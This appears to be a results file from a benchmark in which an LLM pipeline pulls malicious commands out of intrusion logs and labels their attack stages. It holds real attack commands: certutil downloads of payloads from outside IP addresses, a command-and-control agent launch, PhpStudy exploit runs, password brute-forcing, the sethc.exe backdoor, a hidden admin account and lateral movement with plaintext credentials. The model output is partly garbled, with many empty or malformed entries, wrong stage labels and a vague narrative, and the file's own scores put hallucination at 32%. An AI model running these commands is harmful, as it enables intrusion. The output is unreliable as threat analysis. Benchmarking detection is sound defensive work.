@@ -1,0 +1,391 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "postgress.exe --forkavworker 5200",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "taskkill /f /im agent.exe",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe",
+        "stage": "Persistence"
+      },
+      {
+        "command": "start /min C:\\Users\\Public\\agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.224.85.207:8443",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "python PhpStudyPoc.py http://121.36.30.176/",
+        "stage": "Collection"
+      },
+      {
+        "command": "/c python PhpStudyExp2.py http://121.36.30.176/ \"whoami&arp -a&ipconfig&ping www.baidu.com -c 1\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "del /f /q PhpStudyPoc.py",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "del /f /q PhpStudyExp2.py ",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "winbrute.exe administrator_pass.txt administrator",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server /v fDenyTSConnections /t REG_DWORD /d 0 /f",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "netsh advfirewall firewall add rule name=Remote Desktop dir=in action=allow protocol=TCP localport=3390",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "reg add HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe /v Debugger /t REG_SZ /d C:\\windows\\system32\\cmd.exe /f",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "reg add HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe /v Debugger /t REG_SZ /d C:\\windows\\system32\\sethc.exe /f",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "nbtscan.exe 192.168.0.244/24",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "paeexec.exe \\192.168.0.95 -u administrator -p Data123456! ipconfig",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "paeexec.exe \\192.168.0.244 -u administrator -p Data123456! ipconfig",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://111.229.170.12/phpmyadmin/themes/servert.exe C:\\Windows\\ywm.exe",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "net user nbb nb123. /add",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "net localgroup administrators nbb /add",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "cmd.exe /c \"cd /d D:/phpStudy/WWW&net user nbb nb123. /add&net localgroup administrators nbb /add&echo [S]&cd&echo [E]\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "C:\\Windows\\ywm.exe",
+        "stage": "Execution"
+      },
+      {
+        "command": "wmic cpu get NumberOfLogicalProcessors",
+        "stage": "Discovery"
+      },
+      {
+        "command": "systeminfo|find \\u064f\\u0629\\u06e9\\u0651\\u068e\\u0631\\u06cc\\u064b",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "tasklist /svc | findstr TermService",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "tasklist /svc | findstr TermService",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "tasklist /svc | findstr TermService",
+        "stage": "Collection"
+      },
+      {
+        "command": "netstat -ano | findstr 88",
+        "stage": "Discovery"
+      },
+      {
+        "command": "cd /d D:/phpStudy/WWW/&netstat -ano | find \"88\"&echo [S]",
+        "stage": "Discovery"
+      },
+      {
+        "command": "cd /d D:/phpStudy/WWW/&netstat -ano | find \"88\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "cd /d D:/phpStudy/WWW/&netstat -ano | find \"88\"",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "cd /d D:/phpStudy/WWW/&wmic cpu get NumberOfLogicalProcessors&echo [S]",
+        "stage": "Discovery"
+      },
+      {
+        "command": "cd /d D:/phpStudy/WWW/&wmic cpu get NumberOfLogicalProcessors",
+        "stage": "Discovery"
+      },
+      {
+        "command": "cd /d D:/phpStudy/WWW/&wmic memorychip get capacity&echo [S]",
+        "stage": "Collection"
+      },
+      {
+        "command": "cd /d D:/phpStudy/WWW/&wmic memorychip get capacity",
+        "stage": "Collection"
+      },
+      {
+        "command": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe --type=utility --utility-sub-type=unzip.mojom.Unzipper --lang=en-GB --service-sandbox-type=utility --mojo-platform-channel-handle=4480 --field-trial-handle=1296,i,11587666201893271414,3480847453956030777,131072 /prefetch:8",
+        "stage": "Execution"
+      },
+      {
+        "command": "C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\2\\5376_1853232701\\software_reporter_tool.exe",
+        "stage": "Persistence"
+      },
+      {
+        "command": "C:\\Users\\Windows\\ywm.exe",
+        "stage": "Execution"
+      },
+      {
+        "command": "C:\\Windows\\System32\\wsmprovhost.exe",
+        "stage": "Execution"
+      },
+      {
+        "command": "start /min C:\\Users\\Public\\agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "C:\\Users\\Administrator\\AppData\\Roaming\\PhpStudyPoc.py",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -executionpolicy bypass -c echo start:f98e6367-e38b-4e53-ba83-c58ede5c85fc",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -executionpolicy bypass -c \"echo [S]&cd&echo [E]\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -executionpolicy bypass -c \"echo [S]&cd&echo [E]\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -executionpolicy bypass -c cmd /c 'python PhpStudyExp2.py http://121.36.30.176/ \"taskkill /f /im agent.exe&certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe&cmd /c start /min C:\\Users\\Public\\agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443\"'",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -executionpolicy bypass -c reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe /v Debugger /t REG_SZ /d C:\\windows\\system32\\cmd.exe /f",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -executionpolicy bypass -c echo end:b7f92752-df34-4b08-9e98-45a3004b94ff",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powerShell.exe -Execution Policy Bypass -C \"echo start:dbb2f234-101f-4f44-bb97-72263635f506\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "PowerShell.exe -Executionpolicy Bypass -C \"REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe /v Debugger /t REG_SZ /d C:\\windows\\system32\\cmd.exe /f\"",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "powershell.exe -execution policy bypass -c \"echo [S]&cd&echo [E]\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -execution policy bypass -c \"echo start:5a860809-a5ba-4924-8c54-065a8650bdc9\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "PowerShell.exe -Execution Policy Bypass -C \"cmd /c winbrute.exe administrator_password.txt administrator\"",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "PowerShell.exe -Executionpolicy Bypass -C \" cmd /c echo end:5a860809-a5ba-4924-8c54-065a8650bdc9 \"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -execution policy bypass -c \"echo start:b7f92752-df34-4b08-9e98-45a3004b94ff\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe - executionpolicy bypass - c  REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Current Version\\ Image  File  Execution  Options\\ sethc.exe\" / v Debugger / t  REG _ SZ / d  C : \\ windows \\ system32 \\ cmd . exe / f",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "powershell.exe - executionpolicy bypass - c  \" reg  query   HKLM \\ SOFTWARE \\ Microsoft \\ Windows NT \\ CurrentVersion \\ Image  File  Execution  Options \\ sethc.exe \"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe - executionpolicy bypass - c  \" reg  query   HKLM \\ SOFTWARE \\ Microsoft \\ Windows NT \\ CurrentVersion \\ Image  File  Execution  Options \\ sethc.exe \"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe - executionpolicy bypass - c  \" echo   end : b7f92752 - df34 - 4b08 - 9e98 - 45a3004b94ff \", ",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe - executionpolicy bypass - c  \" cmd  /c  'python  PhpStudyExp2.py http: // 121.36.30.176/ \"taskkill /f /im agent.exe &certutil -urlcache -split -f http: // 124.223.85.207:8079/sangforcat.exe  C : \\ Users \\ Public \\ agent.exe &cmd /c start /min  C : \\ Users \\ Public \\ agent.exe  - opid 7fa51253 - c053 - 4b44 - 94eb - 5d8a161b429b - server  https: // 124.224.85.207:8443\"'",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe - executionpolicy bypass - c  \" echo   end : dbb2f234 - 101f - 4f44 - bb97 - 72263635f506 \"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe - executionpolicy bypass - c  \" echo   start : e3c59524 - 1c33 - 40e6 - 99c4 - a2d8329d047f \"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe - executionpolicy bypass - c  ",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe - executionpolicy bypass - c  \" cmd  /c  paeexec.exe  \\ 192.168.0.244  - u  administrator  - p  Data123456 !  ipconfig \"",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "powershell.exe - executionpolicy bypass - c  ",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe - executionpolicy bypass - c  ",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe - executionpolicy bypass - c  ",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe - executionpolicy bypass - c  ",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe - executionpolicy bypass - c  ",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershellexecution.exe - Execution Policy Bypass -C  echo   end : e96998eb - ab9a - 4a48 - 979c - fb68511a6a83 \"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe - executionpolicy bypass - c  cmd /c   PAExec.exe  \\ 192.168.0.244  - u  administrator  - p  Data123456 !  ipconfig \"",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "powershellexecution.exe - Execution Policy Bypass -C  echo   start : e3c59524 - 1c33 - 40e6 - 99c4 - a2d8329d047f \"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershellexecution.exe - Execution Policy Bypass -C  ",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershellexecution.exe - Execution Policy Bypass -C  ",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershellexecution.exe - Execution Policy Bypass -C  ",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershellexecution.exe - Execution Policy Bypass -C  ",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershellexecution.exe - Execution Policy Bypass -C  ",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershellexecution.exe - Execution Policy Bypass -C  ",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powerShell.exe -Execution Policy Bypass -C  \" cmd /c  PAExec.exe  \\ 192.168.0.244  - u  administrator  - p  Data123456 !  ipconfig \"",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "powershellexecution.exe - Execution Policy Bypass -C  ",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershellexecution.exe - Execution Policy Bypass -C  ",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershellexecution.exe - Execution Policy Bypass -C  ",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powerShell.exe -Execution Policy Bypass -C  ",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powerShell.exe -Execution Policy Bypass -C  ",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powersheLexEcution.exe - Execution PoliCy BaYpAs -C  ",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershellexecution.exe - Execution Policy Bypass -C  ",
+        "stage": "Defense Evasion"
+      }
+    ],
+    "narrative": "The attackers initiated their campaign by gaining initial access using postgress.exe, CertUtil, and chrome.exe. Once inside, they installed malicious agents (agent.exe) to maintain persistence. Through discovery, they mapped the target environment and collected sensitive information via WMIC queries. In order to gain elevated privileges, they manipulated Remote Desktop settings. The attackers then used powerShell-execution to create a new adminlevel user. During  Privilege Escalation they also utilized winbrute.exe to brute-force passwords. They repeatedly showed professionalism in executing several defense evasion tactics throughout their campaign. In a final series of operations, the attackers chose to create and connect windows remote desktop sessions. At numerous times during the breach the attackers simultaneously displayed both lateral movement as well as collection efforts leading towards advancement in the overall sequence of attacks. An exploration of options indicates that valid executable files were made available for further evaluation as well as exploitation of certain remote desktop functionalities. It seems there may be instances where the attackers possibly leveraged correct use of commands and system utilities, seemingly displaying high degree of knowledge of unique default features within operating systems otherwise difficult to expose. However, particular results indicate that the adversaries do sometimes prefer employing classic scripts and known methods for obtaining desired objectives. Overall, attackers appear highly adaptable, creative and professional, and therefore can pose significant threats within future cyber scenarios.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 22098,
+      "completion_tokens": 6983,
+      "total_tokens": 29081,
+      "wall_clock_s": 83.648,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.11764705882352941,
+      "recall": 0.8333333333333334,
+      "f1": 0.20618556701030927,
+      "tp": 10,
+      "fp": 75,
+      "fn": 2
+    },
+    "stage": {
+      "precision": 0.011764705882352941,
+      "recall": 0.16666666666666666,
+      "f1": 0.02197802197802198,
+      "tp": 1,
+      "fp": 84,
+      "fn": 5,
+      "recall_partial": 0.4166666666666667
+    },
+    "hallucination_rate": 0.3225806451612903,
+    "cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 22098,
+      "completion_tokens": 6983,
+      "total_tokens": 29081,
+      "wall_clock_s": 83.648,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "v4_triage",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe",
+    "triage": true
+  }
+}
